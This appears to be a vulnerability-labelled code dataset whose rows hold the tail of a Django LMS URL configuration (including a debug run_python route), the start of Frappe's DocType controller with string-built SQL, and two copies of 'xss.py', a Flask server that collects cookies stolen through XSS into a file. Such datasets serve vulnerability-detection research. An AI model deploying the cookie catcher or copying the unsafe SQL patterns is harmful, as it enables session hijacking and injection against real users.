        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/(?P<page>[^/]*)$',
            'staticbook.views.pdf_index', name=""pdf_book""),

        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$',
            'staticbook.views.pdf_index', name=""pdf_book""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/(?P<page>[^/]*)$',
            'staticbook.views.pdf_index', name=""pdf_book""),

        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/$',
            'staticbook.views.html_index', name=""html_book""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$',
            'staticbook.views.html_index', name=""html_book""),

        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/?$',
            'courseware.views.index', name=""courseware""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/$',
            'courseware.views.index', name=""courseware_chapter""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/(?P<section>[^/]*)/$',
            'courseware.views.index', name=""courseware_section""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/(?P<section>[^/]*)/(?P<position>[^/]*)/?$',
            'courseware.views.index', name=""courseware_position""),

        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/progress$',
            'courseware.views.progress', name=""progress""),
        # Takes optional student_id for instructor use--shows profile as that student sees it.
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/progress/(?P<student_id>[^/]*)/$',
            'courseware.views.progress', name=""student_progress""),

        # For the instructor
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/instructor$',
            'instructor.views.instructor_dashboard', name=""instructor_dashboard""),

        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/gradebook$',
            'instructor.views.gradebook', name='gradebook'),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/grade_summary$',
            'instructor.views.grade_summary', name='grade_summary'),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading$',
            'open_ended_grading.views.staff_grading', name='staff_grading'),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/get_next$',
            'open_ended_grading.staff_grading_service.get_next', name='staff_grading_get_next'),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/save_grade$',
            'open_ended_grading.staff_grading_service.save_grade', name='staff_grading_save_grade'),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/save_grade$',
            'open_ended_grading.staff_grading_service.save_grade', name='staff_grading_save_grade'),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/get_problem_list$',
            'open_ended_grading.staff_grading_service.get_problem_list', name='staff_grading_get_problem_list'),

        # Open Ended problem list
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_problems$',
            'open_ended_grading.views.student_problem_list', name='open_ended_problems'),

        # Open Ended flagged problem list
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_flagged_problems$',
            'open_ended_grading.views.flagged_problem_list', name='open_ended_flagged_problems'),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_flagged_problems/take_action_on_flags$',
            'open_ended_grading.views.take_action_on_flags', name='open_ended_flagged_problems_take_action'),

        # Cohorts management
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts$',
            'course_groups.views.list_cohorts', name=""cohorts""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/add$',
            'course_groups.views.add_cohort',
            name=""add_cohort""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)$',
            'course_groups.views.users_in_cohort',
            name=""list_cohort""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)/add$',
            'course_groups.views.add_users_to_cohort',
            name=""add_to_cohort""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)/delete$',
            'course_groups.views.remove_user_from_cohort',
            name=""remove_from_cohort""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/debug$',
            'course_groups.views.debug_cohort_mgmt',
            name=""debug_cohort_mgmt""),

        # Open Ended Notifications
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_notifications$',
            'open_ended_grading.views.combined_notifications', name='open_ended_notifications'),

        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/peer_grading$',
            'open_ended_grading.views.peer_grading', name='peer_grading'),

        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/notes$', 'notes.views.notes', name='notes'),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/notes/', include('notes.urls')),

    )

    # allow course staff to change to student view of courseware
    if settings.MITX_FEATURES.get('ENABLE_MASQUERADE'):
        urlpatterns += (
            url(r'^masquerade/(?P<marg>.*)$', 'courseware.masquerade.handle_ajax', name=""masquerade-switch""),
        )

    # discussion forums live within courseware, so courseware must be enabled first
    if settings.MITX_FEATURES.get('ENABLE_DISCUSSION_SERVICE'):
        urlpatterns += (
            url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/news$',
                'courseware.views.news', name=""news""),
            url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/discussion/',
                include('django_comment_client.urls'))
        )
    urlpatterns += (
        # This MUST be the last view in the courseware--it's a catch-all for custom tabs.
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/(?P<tab_slug>[^/]+)/$',
        'courseware.views.static_tab', name=""static_tab""),
    )

    if settings.MITX_FEATURES.get('ENABLE_STUDENT_HISTORY_VIEW'):
        urlpatterns += (
            url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/submission_history/(?P<student_username>[^/]*)/(?P<location>.*?)$',
                'courseware.views.submission_history',
                name='submission_history'),
        )


if settings.ENABLE_JASMINE:
    urlpatterns += (url(r'^_jasmine/', include('django_jasmine.urls')),)

if settings.DEBUG or settings.MITX_FEATURES.get('ENABLE_DJANGO_ADMIN_SITE'):
    ## Jasmine and admin
    urlpatterns += (url(r'^admin/', include(admin.site.urls)),)

if settings.MITX_FEATURES.get('AUTH_USE_OPENID'):
    urlpatterns += (
        url(r'^openid/login/$', 'django_openid_auth.views.login_begin', name='openid-login'),
        url(r'^openid/complete/$', 'external_auth.views.openid_login_complete', name='openid-complete'),
        url(r'^openid/logo.gif$', 'django_openid_auth.views.logo', name='openid-logo'),
    )

if settings.MITX_FEATURES.get('AUTH_USE_SHIB'):
    urlpatterns += (
        url(r'^shib-login/$', 'external_auth.views.shib_login', name='shib-login'),
    )

if settings.MITX_FEATURES.get('RESTRICT_ENROLL_BY_REG_METHOD'):
    urlpatterns += (
        url(r'^course_specific_login/(?P<course_id>[^/]+/[^/]+/[^/]+)/$',
            'external_auth.views.course_specific_login', name='course-specific-login'),
        url(r'^course_specific_register/(?P<course_id>[^/]+/[^/]+/[^/]+)/$',
            'external_auth.views.course_specific_register', name='course-specific-register'),

    )


if settings.MITX_FEATURES.get('AUTH_USE_OPENID_PROVIDER'):
    urlpatterns += (
        url(r'^openid/provider/login/$', 'external_auth.views.provider_login', name='openid-provider-login'),
        url(r'^openid/provider/login/(?:.+)$', 'external_auth.views.provider_identity', name='openid-provider-login-identity'),
        url(r'^openid/provider/identity/$', 'external_auth.views.provider_identity', name='openid-provider-identity'),
        url(r'^openid/provider/xrds/$', 'external_auth.views.provider_xrds', name='openid-provider-xrds')
    )

if settings.MITX_FEATURES.get('ENABLE_PEARSON_LOGIN', False):
    urlpatterns += url(r'^testcenter/login$', 'external_auth.views.test_center_login'),

if settings.MITX_FEATURES.get('ENABLE_LMS_MIGRATION'):
    urlpatterns += (
        url(r'^migrate/modules$', 'lms_migration.migrate.manage_modulestores'),
        url(r'^migrate/reload/(?P<reload_dir>[^/]+)$', 'lms_migration.migrate.manage_modulestores'),
        url(r'^migrate/reload/(?P<reload_dir>[^/]+)/(?P<commit_id>[^/]+)$', 'lms_migration.migrate.manage_modulestores'),
        url(r'^gitreload$', 'lms_migration.migrate.gitreload'),
        url(r'^gitreload/(?P<reload_dir>[^/]+)$', 'lms_migration.migrate.gitreload'),
    )

if settings.MITX_FEATURES.get('ENABLE_SQL_TRACKING_LOGS'):
    urlpatterns += (
        url(r'^event_logs$', 'track.views.view_tracking_log'),
        url(r'^event_logs/(?P<args>.+)$', 'track.views.view_tracking_log'),
    )

if settings.MITX_FEATURES.get('ENABLE_SERVICE_STATUS'):
    urlpatterns += (
        url(r'^status/', include('service_status.urls')),
    )

if settings.MITX_FEATURES.get('ENABLE_INSTRUCTOR_BACKGROUND_TASKS'):
    urlpatterns += (
        url(r'^instructor_task_status/$', 'instructor_task.views.instructor_task_status', name='instructor_task_status'),
    )

if settings.MITX_FEATURES.get('RUN_AS_ANALYTICS_SERVER_ENABLED'):
    urlpatterns += (
        url(r'^edinsights_service/', include('edinsights.core.urls')),
    )
    import edinsights.core.registry

# FoldIt views
urlpatterns += (
    # The path is hardcoded into their app...
    url(r'^comm/foldit_ops', 'foldit.views.foldit_ops', name=""foldit_ops""),
)

if settings.MITX_FEATURES.get('ENABLE_DEBUG_RUN_PYTHON'):
    urlpatterns += (
        url(r'^debug/run_python', 'debug.views.run_python'),
    )

# Crowdsourced hinting instructor manager.
if settings.MITX_FEATURES.get('ENABLE_HINTER_INSTRUCTOR_VIEW'):
    urlpatterns += (
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/hint_manager$',
            'instructor.hint_manager.hint_manager', name=""hint_manager""),
    )

urlpatterns = patterns(*urlpatterns)

if settings.DEBUG:
    urlpatterns += static(settings.STATIC_URL, document_root=settings.STATIC_ROOT)

#Custom error pages
handler404 = 'static_template_view.views.render_404'
handler500 = 'static_template_view.views.render_500'
/n/n/n",1
114,114,33993d2dca4259e574211b8fa84032894b278bb0,"xss.py/n/nfrom flask import Flask,request
from termcolor import colored
from time import sleep
print ('\n\t[ Steal Cookie Using Xss .. ]\n')
print(colored('\n[*] ','yellow')+'Coded By : Khaled Nassar @knassar702\n\n')
sleep(2)
app = Flask(__name__)
@app.route('/')
def index():
	return 'Hello ^_^'
@app.route('/cookie',methods=['GET','POST'])
def steal():
	if request.method == ""GET"" or request.method == ""POST"":
		data = request.values
		cookie = data.get('cookie')
		with open('cookies.txt',mode='a') as f:
			f.write('\n---------------------------\n'+cookie+'\n---------------------------\n')
		print(colored('\n\n[+] ','green')+'New Cookie ..\n\n')
		return 'Thanks :)'
if __name__ == '__main__':
	app.run()
/n/n/n",0
115,115,33993d2dca4259e574211b8fa84032894b278bb0,"/xss.py/n/nfrom flask import Flask,request
from termcolor import colored
from time import sleep
print ('\n\t[ Steal Cookie Using Xss .. ]\n\n')
print(colored('\n\n[*] ','yellow')+'Coded By : Khaled Nassar @knassar702\n\n')
sleep(2)
app = Flask(__name__)
@app.route('/')
def index():
	return 'Hello ^_^'
@app.route('/cookie',methods=['GET','POST'])
def steal():
	if request.method == ""GET"" or request.method == ""POST"":
		data = request.values
		cookie = data.get('cookie')
		with open('cookies.txt',mode='a') as f:
			f.write('\n---------------------------\n'+cookie+'\n---------------------------\n')
		print(colored('\n\n[+] ','green')+'New Cookie ..\n\n')
		return 'Thanks :)'
if __name__ == '__main__':
	app.run()
/n/n/n",1
72,72,acd2f589b6cd2d1011be4a4e4965a1b3ed489c37,"frappe/core/doctype/doctype/doctype.py/n/n# Copyright (c) 2015, Frappe Technologies Pvt. Ltd. and Contributors
# MIT License. See license.txt

from __future__ import unicode_literals

import six

import re, copy, os, subprocess
import frappe
from frappe import _

from frappe.utils import now, cint
from frappe.model import no_value_fields, default_fields
from frappe.model.document import Document
from frappe.custom.doctype.property_setter.property_setter import make_property_setter
from frappe.desk.notifications import delete_notification_count_for
from frappe.modules import make_boilerplate, get_doc_path
from frappe.model.db_schema import validate_column_name, validate_column_length, type_map
from frappe.model.docfield import supports_translation
import frappe.website.render

# imports - third-party imports
import pymysql
from pymysql.constants import ER

class InvalidFieldNameError(frappe.ValidationError): pass
class UniqueFieldnameError(frappe.ValidationError): pass
class IllegalMandatoryError(frappe.ValidationError): pass
class DoctypeLinkError(frappe.ValidationError): pass
class WrongOptionsDoctypeLinkError(frappe.ValidationError): pass
class HiddenAndMandatoryWithoutDefaultError(frappe.ValidationError): pass
class NonUniqueError(frappe.ValidationError): pass
class CannotIndexedError(frappe.ValidationError): pass
class CannotCreateStandardDoctypeError(frappe.ValidationError): pass

form_grid_templates = {
	""fields"": ""templates/form_grid/fields.html""
}

class DocType(Document):
	def get_feed(self):
		return self.name

	def validate(self):
		""""""Validate DocType before saving.

		- Check if developer mode is set.
		- Validate series
		- Check fieldnames (duplication etc)
		- Clear permission table for child tables
		- Add `amended_from` and `amended_by` if Amendable""""""

		self.check_developer_mode()

		self.validate_name()

		if self.issingle:
			self.allow_import = 0
			self.is_submittable = 0
			self.istable = 0

		elif self.istable:
			self.allow_import = 0
			self.permissions = []

		self.scrub_field_names()
		self.set_default_in_list_view()
		self.set_default_translatable()
		self.validate_series()
		self.validate_document_type()
		validate_fields(self)

		if self.istable:
			# no permission records for child table
			self.permissions = []
		else:
			validate_permissions(self)

		self.make_amendable()
		self.validate_website()

		if not self.is_new():
			self.before_update = frappe.get_doc('DocType', self.name)

		if not self.is_new():
			self.setup_fields_to_fetch()

		if self.default_print_format and not self.custom:
			frappe.throw(_('Standard DocType cannot have default print format, use Customize Form'))

	def set_default_in_list_view(self):
		'''Set default in-list-view for first 4 mandatory fields'''
		if not [d.fieldname for d in self.fields if d.in_list_view]:
			cnt = 0
			for d in self.fields:
				if d.reqd and not d.hidden and not d.fieldtype == ""Table"":
					d.in_list_view = 1
					cnt += 1
					if cnt == 4: break

	def set_default_translatable(self):
		'''Ensure that non-translatable never will be translatable'''
		for d in self.fields:
			if d.translatable and not supports_translation(d.fieldtype):
				d.translatable = 0

	def check_developer_mode(self):
		""""""Throw exception if not developer mode or via patch""""""
		if frappe.flags.in_patch or frappe.flags.in_test:
			return

		if not frappe.conf.get(""developer_mode"") and not self.custom:
			frappe.throw(_(""Not in Developer Mode! Set in site_config.json or make 'Custom' DocType.""), CannotCreateStandardDoctypeError)

	def setup_fields_to_fetch(self):
		'''Setup query to update values for newly set fetch values'''
		try:
			old_meta = frappe.get_meta(frappe.get_doc('DocType', self.name), cached=False)
			old_fields_to_fetch = [df.fieldname for df in old_meta.get_fields_to_fetch()]
		except frappe.DoesNotExistError:
			old_fields_to_fetch = []

		new_meta = frappe.get_meta(self, cached=False)

		self.flags.update_fields_to_fetch_queries = []

		if set(old_fields_to_fetch) != set([df.fieldname for df in new_meta.get_fields_to_fetch()]):
			for df in new_meta.get_fields_to_fetch():
				if df.fieldname not in old_fields_to_fetch:
					link_fieldname, source_fieldname = df.fetch_from.split('.', 1)
					link_df = new_meta.get_field(link_fieldname)

					self.flags.update_fields_to_fetch_queries.append('''update
							`tab{link_doctype}` source,
							`tab{doctype}` target
						set
							target.`{fieldname}` = source.`{source_fieldname}`
						where
							target.`{link_fieldname}` = source.name
							and ifnull(target.`{fieldname}`, '')="""" '''.format(
								link_doctype = link_df.options,
								source_fieldname = source_fieldname,
								doctype = self.name,
								fieldname = df.fieldname,
								link_fieldname = link_fieldname
					))

	def update_fields_to_fetch(self):
		'''Update fetch values based on queries setup'''
		if self.flags.update_fields_to_fetch_queries and not self.issingle:
			for query in self.flags.update_fields_to_fetch_queries:
				frappe.db.sql(query)

	def validate_document_type(self):
		if self.document_type==""Transaction"":
			self.document_type = ""Document""
		if self.document_type==""Master"":
			self.document_type = ""Setup""

	def validate_website(self):
		""""""Ensure that website generator has field 'route'""""""
		if self.has_web_view:
			# route field must be present
			if not 'route' in [d.fieldname for d in self.fields]:
				frappe.throw(_('Field ""route"" is mandatory for Web Views'), title='Missing Field')

			# clear website cache
			frappe.website.render.clear_cache()

	def change_modified_of_parent(self):
		""""""Change the timestamp of parent DocType if the current one is a child to clear caches.""""""
		if frappe.flags.in_import:
			return
		parent_list = frappe.db.sql(""""""SELECT parent
			from tabDocField where fieldtype=""Table"" and options=%s"""""", self.name)
		for p in parent_list:
			frappe.db.sql('UPDATE tabDocType SET modified=%s WHERE `name`=%s', (now(), p[0]))

	def scrub_field_names(self):
		""""""Sluggify fieldnames if not set from Label.""""""
		restricted = ('name','parent','creation','modified','modified_by',
			'parentfield','parenttype','file_list', 'flags', 'docstatus')
		for d in self.get(""fields""):
			if d.fieldtype:
				if (not getattr(d, ""fieldname"", None)):
					if d.label:
						d.fieldname = d.label.strip().lower().replace(' ','_')
						if d.fieldname in restricted:
							d.fieldname = d.fieldname + '1'
						if d.fieldtype=='Section Break':
							d.fieldname = d.fieldname + '_section'
						elif d.fieldtype=='Column Break':
							d.fieldname = d.fieldname + '_column'
					else:
						d.fieldname = d.fieldtype.lower().replace("" "",""_"") + ""_"" + str(d.idx)

				d.fieldname = re.sub('''['"",./%@()<>{}]''', '', d.fieldname)

				# fieldnames should be lowercase
				d.fieldname = d.fieldname.lower()

			# unique is automatically an index
			if d.unique: d.search_index = 0

	def validate_series(self, autoname=None, name=None):
		""""""Validate if `autoname` property is correctly set.""""""
		if not autoname: autoname = self.autoname
		if not name: name = self.name

		if not autoname and self.get(""fields"", {""fieldname"":""naming_series""}):
			self.autoname = ""naming_series:""

		# validate field name if autoname field:fieldname is used
		# Create unique index on autoname field automatically.
		if autoname and autoname.startswith('field:'):
			field = autoname.split("":"")[1]
			if not field or field not in [ df.fieldname for df in self.fields ]:
				frappe.throw(_(""Invalid fieldname '{0}' in autoname"".format(field)))
			else:
				for df in self.fields:
					if df.fieldname == field:
						df.unique = 1
						break

		if autoname and (not autoname.startswith('field:')) \
			and (not autoname.startswith('eval:')) \
			and (not autoname.lower() in ('prompt', 'hash')) \
			and (not autoname.startswith('naming_series:')):

			prefix = autoname.split('.')[0]
			used_in = frappe.db.sql('select name from tabDocType where substring_index(autoname, ""."", 1) = %s and name!=%s', (prefix, name))
			if used_in:
				frappe.throw(_(""Series {0} already used in {1}"").format(prefix, used_in[0][0]))

	def on_update(self):
		""""""Update database schema, make controller templates if `custom` is not set and clear cache.""""""
		from frappe.model.db_schema import updatedb
		self.delete_duplicate_custom_fields()
		try:
			updatedb(self.name, self)
		except Exception as e:
			print(""\n\nThere was an issue while migrating the DocType: {}\n"".format(self.name))
			raise e

		self.change_modified_of_parent()
		make_module_and_roles(self)

		self.update_fields_to_fetch()

		from frappe import conf
		if not self.custom and not (frappe.flags.in_import or frappe.flags.in_test) and conf.get('developer_mode'):
			self.export_doc()
			self.make_controller_template()

			if self.has_web_view:
				self.set_base_class_for_controller()

		# update index
		if not self.custom:
			self.run_module_method(""on_doctype_update"")
			if self.flags.in_insert:
				self.run_module_method(""after_doctype_insert"")

		delete_notification_count_for(doctype=self.name)
		frappe.clear_cache(doctype=self.name)

		if not frappe.flags.in_install and hasattr(self, 'before_update'):
			self.sync_global_search()

		# clear from local cache
		if self.name in frappe.local.meta_cache:
			del frappe.local.meta_cache[self.name]

		clear_linked_doctype_cache()

	def delete_duplicate_custom_fields(self):
		if not (frappe.db.table_exists(self.name) and frappe.db.table_exists(""Custom Field"")):
			return
		fields = [d.fieldname for d in self.fields if d.fieldtype in type_map]
		frappe.db.sql('''delete from
				`tabCustom Field`
			where
				 dt = {0} and fieldname in ({1})
		'''.format('%s', ', '.join(['%s'] * len(fields))), tuple([self.name] + fields), as_dict=True)

	def sync_global_search(self):
		'''If global search settings are changed, rebuild search properties for this table'''
		global_search_fields_before_update = [d.fieldname for d in
			self.before_update.fields if d.in_global_search]
		if self.before_update.show_name_in_global_search:
			global_search_fields_before_update.append('name')

		global_search_fields_after_update = [d.fieldname for d in
			self.fields if d.in_global_search]
		if self.show_name_in_global_search:
			global_search_fields_after_update.append('name')

		if set(global_search_fields_before_update) != set(global_search_fields_after_update):
			now = (not frappe.request) or frappe.flags.in_test or frappe.flags.in_install
			frappe.enqueue('frappe.utils.global_search.rebuild_for_doctype',
				now=now, doctype=self.name)

	def set_base_class_for_controller(self):
		'''Updates the controller class to subclass from `WebsiteGenertor`,
		if it is a subclass of `Document`'''
		controller_path = frappe.get_module_path(frappe.scrub(self.module),
			'doctype', frappe.scrub(self.name), frappe.scrub(self.name) + '.py')

		with open(controller_path, 'r') as f:
			code = f.read()

		class_string = '\nclass {0}(Document)'.format(self.name.replace(' ', ''))
		if '\nfrom frappe.model.document import Document' in code and class_string in code:
			code = code.replace('from frappe.model.document import Document',
				'from frappe.website.website_generator import WebsiteGenerator')
			code = code.replace('class {0}(Document)'.format(self.name.replace(' ', '')),
				'class {0}(WebsiteGenerator)'.format(self.name.replace(' ', '')))

		with open(controller_path, 'w') as f:
			f.write(code)


	def run_module_method(self, method):
		from frappe.modules import load_doctype_module
		module = load_doctype_module(self.name, self.module)
		if hasattr(module, method):
			getattr(module, method)()

	def before_rename(self, old, new, merge=False):
		""""""Throw exception if merge. DocTypes cannot be merged.""""""
		if not self.custom and frappe.session.user != ""Administrator"":
			frappe.throw(_(""DocType can only be renamed by Administrator""))

		self.check_developer_mode()
		self.validate_name(new)

		if merge:
			frappe.throw(_(""DocType can not be merged""))

		# Do not rename and move files and folders for custom doctype
		if not self.custom and not frappe.flags.in_test and not frappe.flags.in_patch:
			self.rename_files_and_folders(old, new)

	def after_rename(self, old, new, merge=False):
		""""""Change table name using `RENAME TABLE` if table exists. Or update
		`doctype` property for Single type.""""""
		if self.issingle:
			frappe.db.sql(""""""update tabSingles set doctype=%s where doctype=%s"""""", (new, old))
			frappe.db.sql(""""""update tabSingles set value=%s
				where doctype=%s and field='name' and value = %s"""""", (new, new, old))
		else:
			frappe.db.sql(""rename table `tab%s` to `tab%s`"" % (old, new))

	def rename_files_and_folders(self, old, new):
		# move files
		new_path = get_doc_path(self.module, 'doctype', new)
		subprocess.check_output(['mv', get_doc_path(self.module, 'doctype', old), new_path])

		# rename files
		for fname in os.listdir(new_path):
			if frappe.scrub(old) in fname:
				subprocess.check_output(['mv', os.path.join(new_path, fname),
					os.path.join(new_path, fname.replace(frappe.scrub(old), frappe.scrub(new)))])

		self.rename_inside_controller(new, old, new_path)
		frappe.msgprint('Renamed files and replaced code in controllers, please check!')

	def rename_inside_controller(self, new, old, new_path):
		for fname in ('{}.js', '{}.py', '{}_list.js', '{}_calendar.js', 'test_{}.py', 'test_{}.js'):
			fname = os.path.join(new_path, fname.format(frappe.scrub(new)))
			if os.path.exists(fname):
				with open(fname, 'r') as f:
					code = f.read()
				with open(fname, 'w') as f:
					f.write(code.replace(frappe.scrub(old).replace(' ', ''), frappe.scrub(new).replace(' ', '')))

	def before_reload(self):
		""""""Preserve naming series changes in Property Setter.""""""
		if not (self.issingle and self.istable):
			self.preserve_naming_series_options_in_property_setter()

	def preserve_naming_series_options_in_property_setter(self):
		""""""Preserve naming_series as property setter if it does not exist""""""
		naming_series = self.get(""fields"", {""fieldname"": ""naming_series""})

		if not naming_series:
			return

		# check if atleast 1 record exists
		if not (frappe.db.table_exists(self.name) and frappe.db.sql(""select name from `tab{}` limit 1"".format(self.name))):
			return

		existing_property_setter = frappe.db.get_value(""Property Setter"", {""doc_type"": self.name,
			""property"": ""options"", ""field_name"": ""naming_series""})

		if not existing_property_setter:
			make_property_setter(self.name, ""naming_series"", ""options"", naming_series[0].options, ""Text"", validate_fields_for_doctype=False)
			if naming_series[0].default:
				make_property_setter(self.name, ""naming_series"", ""default"", naming_series[0].default, ""Text"", validate_fields_for_doctype=False)

	def export_doc(self):
		""""""Export to standard folder `[module]/doctype/[name]/[name].json`.""""""
		from frappe.modules.export_file import export_to_files
		export_to_files(record_list=[['DocType', self.name]], create_init=True)

	def import_doc(self):
		""""""Import from standard folder `[module]/doctype/[name]/[name].json`.""""""
		from frappe.modules.import_module import import_from_files
		import_from_files(record_list=[[self.module, 'doctype', self.name]])

	def make_controller_template(self):
		""""""Make boilerplate controller template.""""""
		make_boilerplate(""controller._py"", self)

		if not self.istable:
			make_boilerplate(""test_controller._py"", self.as_dict())
			make_boilerplate(""controller.js"", self.as_dict())
			#make_boilerplate(""controller_list.js"", self.as_dict())
			if not os.path.exists(frappe.get_module_path(frappe.scrub(self.module),
				'doctype', frappe.scrub(self.name), 'tests')):
				make_boilerplate(""test_controller.js"", self.as_dict())

		if self.has_web_view:
			templates_path = frappe.get_module_path(frappe.scrub(self.module), 'doctype', frappe.scrub(self.name), 'templates')
			if not os.path.exists(templates_path):
				os.makedirs(templates_path)
			make_boilerplate('templates/controller.html', self.as_dict())
			make_boilerplate('templates/controller_row.html', self.as_dict())

	def make_amendable(self):
		""""""If is_submittable is set, add amended_from docfields.""""""
		if self.is_submittable:
			if not frappe.db.sql(""""""select name from tabDocField
				where fieldname = 'amended_from' and parent = %s"""""", self.name):
					self.append(""fields"", {
						""label"": ""Amended From"",
						""fieldtype"": ""Link"",
						""fieldname"": ""amended_from"",
						""options"": self.name,
						""read_only"": 1,
						""print_hide"": 1,
						""no_copy"": 1
					})

	def get_max_idx(self):
		""""""Returns the highest `idx`""""""
		max_idx = frappe.db.sql(""""""select max(idx) from `tabDocField` where parent = %s"""""",
			self.name)
		return max_idx and max_idx[0][0] or 0

	def validate_name(self, name=None):
		if not name:
			name = self.name

		# a DocType's name should not start with a number or underscore
		# and should only contain letters, numbers and underscore
		if six.PY2:
			is_a_valid_name = re.match(""^(?![\W])[^\d_\s][\w ]+$"", name)
		else:
			is_a_valid_name = re.match(""^(?![\W])[^\d_\s][\w ]+$"", name, flags = re.ASCII)
		if not is_a_valid_name:
			frappe.throw(_(""DocType's name should start with a letter and it can only consist of letters, numbers, spaces and underscores""), frappe.NameError)

def validate_fields_for_doctype(doctype):
	doc = frappe.get_doc(""DocType"", doctype)
	doc.delete_duplicate_custom_fields()
	validate_fields(frappe.get_meta(doctype, cached=False))

# this is separate because it is also called via custom field
def validate_fields(meta):
	""""""Validate doctype fields. Checks
	1. There are no illegal characters in fieldnames
	2. If fieldnames are unique.
	3. Validate column length.
	4. Fields that do have database columns are not mandatory.
	5. `Link` and `Table` options are valid.
	6. **Hidden** and **Mandatory** are not set simultaneously.
	7. `Check` type field has default as 0 or 1.
	8. `Dynamic Links` are correctly defined.
	9. Precision is set in numeric fields and is between 1 & 6.
	10. Fold is not at the end (if set).
	11. `search_fields` are valid.
	12. `title_field` and title field pattern are valid.
	13. `unique` check is only valid for Data, Link and Read Only fieldtypes.
	14. `unique` cannot be checked if there exist non-unique values.

	:param meta: `frappe.model.meta.Meta` object to check.""""""
	def check_illegal_characters(fieldname):
		validate_column_name(fieldname)

	def check_unique_fieldname(docname, fieldname):
		duplicates = list(filter(None, map(lambda df: df.fieldname==fieldname and str(df.idx) or None, fields)))
		if len(duplicates) > 1:
			frappe.throw(_(""{0}: Fieldname {1} appears multiple times in rows {2}"").format(docname, fieldname, "", "".join(duplicates)), UniqueFieldnameError)

	def check_fieldname_length(fieldname):
		validate_column_length(fieldname)

	def check_illegal_mandatory(docname, d):
		if (d.fieldtype in no_value_fields) and d.fieldtype!=""Table"" and d.reqd:
			frappe.throw(_(""{0}: Field {1} of type {2} cannot be mandatory"").format(docname, d.label, d.fieldtype), IllegalMandatoryError)

	def check_link_table_options(docname, d):
		if d.fieldtype in (""Link"", ""Table""):
			if not d.options:
				frappe.throw(_(""{0}: Options required for Link or Table type field {1} in row {2}"").format(docname, d.label, d.idx), DoctypeLinkError)
			if d.options==""[Select]"" or d.options==d.parent:
				return
			if d.options != d.parent:
				options = frappe.db.get_value(""DocType"", d.options, ""name"")
				if not options:
					frappe.throw(_(""{0}: Options must be a valid DocType for field {1} in row {2}"").format(docname, d.label, d.idx), WrongOptionsDoctypeLinkError)
				elif not (options == d.options):
					frappe.throw(_(""{0}: Options {1} must be the same as doctype name {2} for the field {3}"", DoctypeLinkError)
						.format(docname, d.options, options, d.label))
				else:
					# fix case
					d.options = options

	def check_hidden_and_mandatory(docname, d):
		if d.hidden and d.reqd and not d.default:
			frappe.throw(_(""{0}: Field {1} in row {2} cannot be hidden and mandatory without default"").format(docname, d.label, d.idx), HiddenAndMandatoryWithoutDefaultError)

	def check_width(d):
		if d.fieldtype == ""Currency"" and cint(d.width) < 100:
			frappe.throw(_(""Max width for type Currency is 100px in row {0}"").format(d.idx))

	def check_in_list_view(d):
		if d.in_list_view and (d.fieldtype in not_allowed_in_list_view):
			frappe.throw(_(""'In List View' not allowed for type {0} in row {1}"").format(d.fieldtype, d.idx))

	def check_in_global_search(d):
		if d.in_global_search and d.fieldtype in no_value_fields:
			frappe.throw(_(""'In Global Search' not allowed for type {0} in row {1}"")
				.format(d.fieldtype, d.idx))

	def check_dynamic_link_options(d):
		if d.fieldtype==""Dynamic Link"":
			doctype_pointer = list(filter(lambda df: df.fieldname==d.options, fields))
			if not doctype_pointer or (doctype_pointer[0].fieldtype not in (""Link"", ""Select"")) \
				or (doctype_pointer[0].fieldtype==""Link"" and doctype_pointer[0].options!=""DocType""):
